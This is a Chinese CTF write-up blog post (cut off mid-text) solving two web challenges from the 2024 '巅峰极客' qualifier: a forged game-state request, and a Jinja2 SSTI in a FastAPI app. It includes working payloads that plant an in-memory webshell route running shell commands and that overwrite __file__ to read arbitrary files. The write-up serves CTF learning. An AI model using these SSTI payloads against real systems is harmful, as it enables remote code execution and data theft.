---
title: 2024 第七届“巅峰极客”网络安全技能挑战赛初赛 wp - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18450999
source: 博客园 - 渗透测试中心
date: 2024-10-09
fetch_date: 2025-10-06T18:53:36.040415
---

# 2024 第七届“巅峰极客”网络安全技能挑战赛初赛 wp - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [2024 第七届“巅峰极客”网络安全技能挑战赛初赛 wp](https://www.cnblogs.com/backlion/p/18450999 "发布于 2024-10-08 09:17")

## WEB

### EncirclingGame

题目描述：A simple game, enjoy it and get the flag when you complete it.

开题，前端小游戏，红点出不去就行

![image-20240817132551392](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091701659-149029621.png)

直接玩通关了

![image-20240817133147345](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091702458-555346102.png)

看看如何不玩也能拿到flag，flag存储在后端php文件内，前端找不到。

看一下游戏的请求包，里面记录了红点的最后位置和防火墙（黑点）的位置。

![image-20240817134012060](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091703195-566627568.png)

那么我们伪造下，防火墙绕满周围一圈，但是红点在最中间。

路由：/verifyVictory.php

方法：POST

{"gameState":{"virusPosition":{"x":5,"y":5},"firewalls":[{"x": 0, "y": 0}, {"x": 1, "y": 0}, {"x": 2, "y": 0}, {"x": 3, "y": 0}, {"x": 4, "y": 0},{"x": 5, "y": 0}, {"x": 6, "y": 0}, {"x": 7, "y": 0}, {"x": 8, "y": 0}, {"x": 9, "y": 0}, {"x": 10, "y": 0}, {"x": 0, "y": 10}, {"x": 1, "y": 10}, {"x": 2, "y": 10}, {"x": 3, "y": 10}, {"x": 4, "y": 10}, {"x": 5, "y": 10}, {"x": 6, "y": 10}, {"x": 7, "y": 10}, {"x": 8, "y": 10}, {"x": 9, "y": 10}, {"x": 10, "y": 10}, {"x": 0, "y": 1}, {"x": 0, "y": 2}, {"x": 0, "y": 3}, {"x": 0, "y": 4}, {"x": 0, "y": 5}, {"x": 0, "y": 6}, {"x": 0, "y": 7}, {"x": 0, "y": 8}, {"x": 0, "y": 9}, {"x": 10, "y": 1}, {"x": 10, "y": 2}, {"x": 10, "y": 3}, {"x": 10, "y": 4}, {"x": 10, "y": 5}, {"x": 10, "y": 6}, {"x": 10, "y": 7}, {"x": 10, "y": 8}, {"x": 10, "y": 9}]},"token":"game-lab-token"}

![image-20240817134619754](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091704028-1783562255.png)

### GoldenHornKing

题目描述：举一反三。

开题，直接给了源码

![image-20240817122126538](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091704708-963335772.png)

import os  # 导入操作系统相关的模块

import jinja2  # 导入 Jinja2 模板引擎模块

import functools  # 导入工具函数模块，提供高阶函数

import uvicorn  # 导入 Uvicorn，用于运行 ASGI 应用

from fastapi import FastAPI  # 从 FastAPI 库中导入 FastAPI 类，用于创建应用

from fastapi.templating import Jinja2Templates  # 从 FastAPI 导入 Jinja2Templates，用于模板渲染

from anyio import fail\_after, sleep  # 从 anyio 库中导入 fail\_after 用于设置超时，以及 sleep 用于异步睡眠

# 指定所使用的库的版本：

# jinja2==3.1.2

# uvicorn==0.30.5

# fastapi==0.112.0

def timeout\_after(timeout: int = 1):  # 定义一个超时装饰器，默认超时时间为1秒

def decorator(func):  # 接收一个函数作为参数

@functools.wraps(func)  # 保留被装饰函数的元信息

async def wrapper(\*args, \*\*kwargs):  # 定义一个异步包装函数

with fail\_after(timeout):  # 在指定的超时时间内执行被装饰的函数

return await func(\*args, \*\*kwargs)  # 等待并返回被装饰函数的执行结果

return wrapper  # 返回包装函数

return decorator  # 返回装饰器函数

app = FastAPI()  # 创建一个 FastAPI 应用实例

access = False  # 定义一个全局变量，用于控制访问权限

\_base\_path = os.path.dirname(os.path.abspath(\_\_file\_\_))  # 获取当前文件的绝对路径，并提取其目录路径

t = Jinja2Templates(directory=\_base\_path)  # 创建一个 Jinja2Templates 实例，指定模板文件的目录

@app.get("/")  # 定义一个处理根路径的 GET 请求的路由

@timeout\_after(1)  # 使用超时装饰器，设置超时时间为1秒

async def index():  # 定义异步处理函数

return open(\_\_file\_\_, 'r').read()  # 打开当前文件并读取其内容，作为响应返回

@app.get("/calc")  # 定义一个处理 /calc 路径的 GET 请求的路由

@timeout\_after(1)  # 使用超时装饰器，设置超时时间为1秒

async def ssti(calc\_req: str):  # 定义异步处理函数，接收一个字符串参数 calc\_req

global access  # 声明使用全局变量 access

if (any(char.isdigit() for char in calc\_req)) or ("%\" in calc\_req) or not calc\_req.isascii() or access:

# 检查 calc\_req 中是否包含数字字符，或者包含字符 '%'，或者是否全为 ASCII 字符，或者 access 为 True

return "bad char"  # 如果满足上述任意条件，返回 "bad char"

else:

jinja2.Environment(loader=jinja2.BaseLoader()).from\_string(f"{{{{ {calc\_req} }}}}").render({"app": app})

# 使用 Jinja2 模板引擎渲染 calc\_req 表达式，传递 app 对象作为上下文

access = True  # 设置 access 为 True，限制进一步访问

return "fight"  # 返回 "fight"

if \_\_name\_\_ == "\_\_main\_\_":  # 判断是否为主程序入口

uvicorn.run(app, host="0.0.0.0", port=8000)  # 使用 Uvicorn 运行应用，监听所有网络接口的8000端口

是一个jinja2的SSTI，限制是不能包含数字字符，或者包含字符 '%'，或者是全为 ASCII 字符，或者 access 为 True

同时，只要一次access 为 True后便无法再次输入，得重启环境（好像有点似曾相识，NSS round20我也这样子出题的

仓库里翻一个内存马出来

方法1：

#直接访问/shell路由

app.add\_url\_rule('/flag',lambda:\_\_import\_\_('os').popen('cat /flag').read())

转为SSTIpayload应该如下，由于是FastAPI，add\_url\_rule换成add\_api\_route。同时绕过了题目限制

{{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_['\_\_builtins\_\_'].eval("\_\_import\_\_('sys').modules['\_\_main\_\_'].\_\_dict\_\_['app'].add\_api\_route('/flag', lambda:\_\_import\_\_('os').popen('cat /flag').read())")}}

payload：

/calc?calc\_req=config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_['\_\_builtins\_\_'].eval("\_\_import\_\_('sys').modules['\_\_main\_\_'].\_\_dict\_\_['app'].add\_api\_route('/flag',lambda:\_\_import\_\_('os').popen('cat /flag').read())")

![image-20240817200659420](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091705391-414918884.png)

访问flag路由读取flag

![image-20240817200716896](https://img2023.cnblogs.com/blog/1049983/202410/1049983-20241008091706060-1499452579.png)

方法2：打内存马进行rce

打FastAPI内存马，在FastAPI类有一个add\_api\_route方法，我们可以通过这个方法来增加一个路由，进行rce

```
app.add_api_route('/shell', lambda: __import__('os').popen('whoami').read())
```

```
我们需要再eval里重新获取一遍app也就是FastAPI的对象。

```
__import__('sys').modules['__main__'].__dict__['app']
```
```

1. sys.modules：sys 模块中有一个名为 modules 的字典，它维护了所有已导入模块的当前状态。这个字典的键是模块的名称，而值是对应的模块对象。
2. modules['\_\_main\_\_']：\_\_main\_\_ 是运行 Python 程序的主模块，无论是直接从命令行运行的脚本，还是通过某个执行环境运行的代码。通过 sys.modules['\_\_main\_\_']，我们获取到了当前执行程序的主模块对象。
3. \_\_dict\_\_：每个模块对象都有一个 \_\_dict\_\_ 属性，它是一个字典，包含了模块内定义的所有全局变量和函数。
4. ['app']：最后，从模块的 \_\_dict\_\_ 中获取名为 app 的对象。

然后整合以下payload：

```
app.__init__.__globals__.__builtins__.eval("__import__('sys').modules['__main__'].__dict__['app'].add_api_route('/shell', lambda :__import__('os').popen('cat /flag').read())")
```

现在访问/shell就可以拿到flag了

方法3：修改\_\_file\_\_进行任意文件读取p

```
@app.get("/")
@timeout_after(1)
async def index():
    return open(__file__).read()
```

在跟路由读取了当前代码文件内容，并输出到网页上。那么如果我们能修改\_\_file\_\_为/flag那么访问根路由就能拿到flag了。

\_\_file\_\_在全局变量globals里有

```
setattr(__import__('sys').modules['__main__'],'__file__','/flag')
```

使用setattr(object, name, value)方法修改对象的属性值。

> ```
> object -- 对象。
> name -- 字符串，对象属性。
> value -- 属性值。
> ```
>
> Q：为什么不用\...